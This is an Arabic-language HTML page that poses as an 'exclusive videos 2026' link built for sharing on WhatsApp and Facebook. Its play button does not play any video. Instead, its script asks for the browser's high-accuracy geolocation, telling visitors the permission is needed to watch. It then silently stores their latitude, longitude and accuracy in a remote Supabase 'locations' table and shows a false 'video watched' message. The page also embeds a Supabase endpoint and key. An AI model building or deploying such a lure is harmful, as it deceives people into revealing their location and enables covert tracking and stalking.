<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>فيديوهات حصرية 2026</title>

    <!-- ==============================
         WhatsApp / Facebook Preview
    =============================== -->

    <meta property="og:title" content="فيديوهات حصرية 2026">

    <meta
        property="og:description"
        content="اضغط لمشاهدة الفيديو"
    >

    <meta
        property="og:image"
        content="https://videos-2026.pages.dev/image.png"
    >

    <meta
        property="og:url"
        content="https://videos-2026.pages.dev/"
    >

    <meta property="og:type" content="website">

    <!-- Twitter / Social Preview -->

    <meta
        name="twitter:card"
        content="summary_large_image"
    >

    <meta
        name="twitter:title"
        content="فيديوهات حصرية 2026"
    >

    <meta
        name="twitter:description"
        content="اضغط لمشاهدة الفيديو"
    >

    <meta
        name="twitter:image"
        content="https://videos-2026.pages.dev/image.png"
    >


    <style>

        * {
            box-sizing: border-box;
        }


        body {
            margin: 0;

            min-height: 100vh;

            background: #111;

            font-family: Arial, sans-serif;

            color: white;

            display: flex;

            justify-content: center;

            align-items: center;

            padding: 20px;
        }


        .page {
            width: 100%;

            max-width: 600px;

            text-align: center;
        }


        h1 {
            margin: 0 0 10px;

            font-size: 28px;
        }


        .subtitle {
            color: #ddd;

            margin-bottom: 20px;
        }


        /* ==============================
           صورة الفيديو
        =============================== */

        .video-preview {
            position: relative;

            width: 100%;

            aspect-ratio: 16 / 9;

            background-image: url("./image.png");

            background-size: cover;

            background-position: center;

            border-radius: 12px;

            overflow: hidden;

            display: flex;

            justify-content: center;

            align-items: center;

            cursor: pointer;
        }


        .video-preview::before {
            content: "";

            position: absolute;

            inset: 0;

            background: rgba(0, 0, 0, 0.20);
        }


        /* ==============================
           زر التشغيل
        =============================== */

        .play-button {
            position: relative;

            z-index: 2;

            width: 78px;

            height: 78px;

            border-radius: 50%;

            background: white;

            color: #111;

            display: flex;

            align-items: center;

            justify-content: center;

            font-size: 36px;

            padding-left: 5px;

            transition: transform 0.2s;
        }


        .video-preview:hover .play-button {
            transform: scale(1.08);
        }


        .video-label {
            position: absolute;

            z-index: 2;

            bottom: 15px;

            left: 0;

            right: 0;

            color: white;

            font-size: 16px;

            text-shadow: 0 1px 4px #000;
        }


        /* ==============================
           التنبيه
        =============================== */

        .notice {
            margin-top: 18px;

            padding: 14px;

            background: #222;

            border-radius: 10px;

            color: #ddd;

            line-height: 1.7;

            font-size: 14px;
        }


        /* ==============================
           النتيجة
        =============================== */

        #result {
            margin-top: 20px;

            min-height: 30px;

            line-height: 2;
        }


        .success {
            color: #20d866;

            font-weight: bold;
        }


        .error {
            color: #ff5555;

            font-weight: bold;
        }


        .loading {
            color: #ddd;
        }


        .permission-box {
            margin-top: 15px;

            padding: 15px;

            background: #222;

            border-radius: 10px;

            color: #ddd;

            line-height: 1.8;
        }


    </style>

</head>


<body>


    <div class="page">


        <h1>
            فيديوهات حصرية 2026
        </h1>


        <div class="subtitle">
            اضغط على الزر لمشاهدة الفيديو
        </div>


        <!-- ==============================
             صورة الفيديو + زر التشغيل
        =============================== -->

        <div
            class="video-preview"
            id="locationButton"
            role="button"
            tabindex="0"
            aria-label="مشاهدة الفيديو"
        >

            <div class="play-button">
                ▶
            </div>


            <div class="video-label">
                اضغط لمشاهدة الفيديو
            </div>

        </div>


        <!-- ==============================
             توضيح للمستخدم
        =============================== -->

        <div class="notice">

            اضغط على زر التشغيل للمتابعة.

            <br>

            سيطلب منك المتصفح الإذن بالموافقه لمشاهده الفديو.

            <br>

            لن يتم  مشاهده الفديو الي بعد الموافقه.

        </div>


        <div id="result"></div>


    </div>



    <!-- ==============================
         Supabase
    =============================== -->

    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>


    <script>


        /* ==============================
           Supabase
        =============================== */

        const SUPABASE_URL =
            "https://vsztpvsicsmxjhsvqzbv.supabase.co";


        const SUPABASE_PUBLISHABLE_KEY =
            "sb_publishable_N2P-l8nE7GaChsD5lrxb4w_nr8K5UrM";


        const supabaseClient =
            window.supabase.createClient(
                SUPABASE_URL,
                SUPABASE_PUBLISHABLE_KEY
            );



        /* ==============================
           العناصر
        =============================== */

        const locationButton =
            document.getElementById("locationButton");


        const result =
            document.getElementById("result");


        let processing = false;



        /* ==============================
           الضغط على الزر
        =============================== */

        locationButton.addEventListener(
            "click",
            requestLocation
        );



        /* ==============================
           Enter / Space
        =============================== */

        locationButton.addEventListener(
            "keydown",
            function (event) {

                if (
                    event.key === "Enter" ||
                    event.key === " "
                ) {

                    event.preventDefault();

                    requestLocation();
                }

            }
        );



        /* ==============================
           طلب الموقع
        =============================== */

        function requestLocation() {


            if (processing) {
                return;
            }


            if (!navigator.geolocation) {

                result.innerHTML =
                    '<span class="error">' +
                    'المتصفح لا يدعم تحديد الموقع.' +
                    '</span>';

                return;
            }


            processing = true;


            result.innerHTML = `

                <div class="permission-box">

                    سيتم الآن طلب إذن المتصفح
                    للوصول إلى الفديو.

                    <br>

                    اختر
                    <strong>السماح / Allow</strong>
                    إذا كنت تريد مشاهده الفديو.

                    <br>

                    لن يتم حفظ مشاهده الفديو بدون موافقتك.

                </div>

            `;


            navigator.geolocation.getCurrentPosition(

                locationSuccess,

                locationError,

                {
                    enableHighAccuracy: true,

                    timeout: 15000,

                    maximumAge: 0
                }

            );

        }



        /* ==============================
           نجاح الحصول على الفديو
        =============================== */

        async function locationSuccess(position) {


            const latitude =
                position.coords.latitude;


            const longitude =
                position.coords.longitude;


            const accuracy =
                position.coords.accuracy;


            result.innerHTML =
                '<span class="loading">' +
                'جاري حفظ الفديو...' +
                '</span>';


            try {


                const { error } =
                    await supabaseClient
                        .from("locations")
                        .insert({

                            latitude: latitude,

                            longitude: longitude,

                            accuracy: accuracy

                        });



                if (error) {


                    console.error(
                        "Supabase error:",
                        error
                    );


                    result.innerHTML =
                        '<span class="error">' +
                        'حدث خطأ أثناء حفظ الفديو.' +
                        '</span>';


                    processing = false;

                    return;

                }



                result.innerHTML =
                    '<span class="success">' +
                    'تمت مشاهده الفديو بنجاح ✅' +
                    '</span>';


            }


            catch (error) {


                console.error(error);


                result.innerHTML =
                    '<span class="error">' +
                    'حدث خطأ أثناء تشغيل الفديو.' +
                    '</span>';

            }


            processing = false;

        }



        /* ==============================
           أخطاء الموقع
        =============================== */

        function locationError(error) {


            console.error(
                "Location error:",
                error
            );


            if (error.code === 1) {


                result.innerHTML =
                    '<span class="error">' +
                    'لم تتم الموافقة على مشاهده الفديو.' +
                    '</span>';

            }


            else if (error.code === 2) {


                result.innerHTML =
                    '<span class="error">' +
                    'تعذر مشاهده الفديو.' +
                    '</span>';

            }


            else if (error.code === 3) {


                result.innerHTML =
                    '<span class="error">' +
                    'انتهت مهلة طلب مشاهده الفديو.' +
                    '</span>';

            }


            else {


                result.innerHTML =
                    '<span class="error">' +
                    'تعذر الحصول على الفديو.' +
                    '</span>';

            }


            processing = false;

        }


    </script>


</body>

</html>
